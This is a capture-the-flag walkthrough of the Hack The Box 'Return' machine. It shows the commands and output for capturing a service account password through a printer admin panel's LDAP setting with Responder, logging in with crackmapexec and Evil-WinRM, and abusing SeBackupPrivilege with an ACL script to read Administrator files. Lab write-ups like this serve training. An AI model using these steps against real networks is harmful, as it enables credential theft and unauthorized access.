# Return

Return is a easy HTB lab that focuses on exploit network printer administration panel and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

### Recon

The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
[★]$ IP=10.129.95.241
[★]$ sudo nmap -p- -sV -sC $IP

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 04:23 GMT
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 16.00% done; ETC: 04:25 (0:00:32 remaining)
Nmap scan report for 10.129.95.241
Host is up (0.024s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-05 04:43:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m34s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-05T04:44:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.84 seconds
```

### User
Adding new domains to `/etc/hosts`. `sudo tee --append /etc/hosts <<< "10.129.95.241 return.local0 return.local"`

`printer.return.local` makes ldap request for `svc-printer` password update. Let's cature this:

We can make the request to our server instead of printer.return.local to capture this request credentials:
```
$ sudo responder -I tun0

[LDAP] Cleartext Client   : 10.129.95.241
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1ed******012!!
```

[★]$ sudo crackmapexec smb return.local -u 'svc-printer' -p '1ed******012!!' --shares
```
SMB         return.local0   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         return.local0   445    PRINTER          [+] return.local\svc-printer:1ed******012!!
SMB         return.local0   445    PRINTER          [+] Enumerated shares
SMB         return.local0   445    PRINTER          Share           Permissions     Remark
SMB         return.local0   445    PRINTER          -----           -----------     ------
SMB         return.local0   445    PRINTER          ADMIN$          READ            Remote Admin
SMB         return.local0   445    PRINTER          C$              READ,WRITE      Default share
SMB         return.local0   445    PRINTER          IPC$            READ            Remote IPC
SMB         return.local0   445    PRINTER          NETLOGON        READ            Logon server share 
SMB         return.local0   445    PRINTER          SYSVOL          READ            Logon server share 
```

Using these credentials, we can get the user flag:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> type ..\Desktop\user.txt
```
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Checking the permissions of the current users:
```
*Evil-WinRM* PS C:\Users\svc-printer> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Based on this privilege, we can search for the exploits for `SeBackupPrivilege`. Using this, we can exploit using https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1

Updating the permissions of the folder so that we can read the flag:
```
*Evil-WinRM* PS C:\Users\svc-printer> Import-module .\acl.ps1; Acl-FullControl -user svc-printer -path c:\users\administrator\
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         RETURN\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)

[+] Changing permissions to c:\users\administrator\
[+] Acls changed successfully.

Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         RETURN\Administrator Allow  FullControl
         RETURN\svc-printer Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA;;;S-1-5-21-3750359090-2939318659-876128439-1103)
```

Getting the flag:
```
*Evil-WinRM* PS C:\Users\svc-printer> type ..\Administrator\Desktop\root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
